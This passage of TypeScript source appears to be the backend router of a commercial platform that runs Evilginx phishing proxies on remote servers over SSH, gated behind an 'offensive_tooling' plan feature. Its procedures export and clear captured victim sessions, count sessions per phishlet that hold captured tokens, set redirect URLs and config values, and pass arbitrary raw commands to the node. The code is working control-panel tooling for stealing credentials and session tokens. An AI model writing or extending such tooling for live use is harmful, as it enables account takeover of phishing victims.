    .input(z.object({ id: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, `sessions ${input.id}`, 15000, ctx.user.id);
      return { output: raw };
    }),

  deleteSession: adminProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, `sessions delete ${input.id}`, 15000, ctx.user.id);
      return { output: raw, success: !raw.includes("error") };
    }),

  /** Set a config value (e.g. domain, redirect_key, unauth_url) */
  setConfig: adminProcedure
    .input(z.object({ key: z.string().min(1), value: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, `config ${input.key} ${input.value}`, 15000, ctx.user.id);
      return { output: raw, success: !raw.includes("error") };
    }),

  /** Get current config */
  getConfig: adminProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const node = await getActiveNode(ctx.user.id);
    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
    const raw = await execOnNode(node, "config", 15000, ctx.user.id);
    return { output: raw };
  }),

  /** Get Evilginx logs from the VPS */
  getLogs: adminProcedure
    .input(z.object({ lines: z.number().min(1).max(500).default(100) }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const script = `journalctl -u evilginx -n ${input.lines} --no-pager 2>/dev/null || tail -${input.lines} /var/log/evilginx.log 2>/dev/null || echo 'No logs found'`;
      const output = await execSSHCommand(nodeToSSH(node), script, 15000, ctx.user.id);
      return { logs: output, output };
    }),

  /** Export all captured sessions as JSON */
  exportSessions: adminProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const node = await getActiveNode(ctx.user.id);
    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
    const raw = await execOnNode(node, "sessions", 20000, ctx.user.id);
    const sessions = parseSessionList(raw);
    return { sessions, count: sessions.length, exportedAt: new Date().toISOString() };
  }),

  /** Clear all captured sessions */
  clearSessions: adminProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const node = await getActiveNode(ctx.user.id);
    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
    const raw = await execOnNode(node, "sessions", 20000, ctx.user.id);
    const sessions = parseSessionList(raw);
    let deleted = 0;
    for (const s of sessions) {
      try { await execOnNode(node, `sessions delete ${s.id}`, 10000, ctx.user.id); deleted++; } catch { /* ignore */ }
    }
    return { success: true, deleted };
  }),

  /** Set redirect URL for unauthenticated traffic */
  setRedirectUrl: adminProcedure
    .input(z.object({ url: z.string().min(1) }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, `config redirect_key ${input.url}`, 15000, ctx.user.id);
      return { output: raw, success: !raw.toLowerCase().includes("error") };
    }),

  /** Get per-phishlet session statistics */
  getPhishletStats: adminProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const node = await getActiveNode(ctx.user.id);
    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
    const [phishletsRaw, sessionsRaw] = await Promise.all([
      execOnNode(node, "phishlets", 15000, ctx.user.id),
      execOnNode(node, "sessions", 20000, ctx.user.id),
    ]);
    const sessions = parseSessionList(sessionsRaw);
    const phishlets = parsePhishletList(phishletsRaw);
    const stats = phishlets.map(p => ({
      ...p,
      sessionCount: sessions.filter(s => s.phishlet === p.name).length,
      capturedCount: sessions.filter(s => s.phishlet === p.name && s.tokens).length,
    }));
    return { stats, totalSessions: sessions.length };
  }),

  /** Run any raw evilginx command */
  runCommand: adminProcedure
    .input(z.object({ command: z.string().min(1), timeoutMs: z.number().optional().default(30000) }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, input.command, input.timeoutMs, ctx.user.id);
      return { output: raw };
    }),

  // ── Legacy compatibility procedures (kept for existing UI) ────────────────
  connectLocal: adminProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const node = await getActiveNode(ctx.user.id);
    if (!node) return { success: false, message: "No active Evilginx node. Add a dedicated VPS node first.", mode: "none" };
    return { success: true, message: `Connected to "${node.label}" at ${node.publicIp ?? node.sshHost}`, mode: "node", nodeLabel: node.label };
  }),

  getConnection: adminProcedure.query(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const node = await getActiveNode(ctx.user.id);
    const nodes = await getNodes(ctx.user.id);
    return {
      connected: !!node,
      mode: node ? "node" : "none",
      nodeLabel: node?.label,
      publicIp: node?.publicIp,
      nodeCount: nodes.length,
      onlineCount: nodes.filter(n => n.status === "ready" || n.status === "running").length,
      // ConnectionConfig-compatible fields for existing EvilginxPage UI
      host: node?.publicIp ?? node?.sshHost ?? "",
      port: node?.sshPort ?? 22,
      username: node?.sshUser ?? "root",
      hasPassword: !!node?.sshPassword,
      hasPrivateKey: !!node?.sshKey,
      isLocal: false,
      version: node?.version,
    };
  }),

  disconnect: adminProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    await setActiveNodeId(ctx.user.id, null);
    return { success: true, message: "Disconnected from active node." };
  }),
});
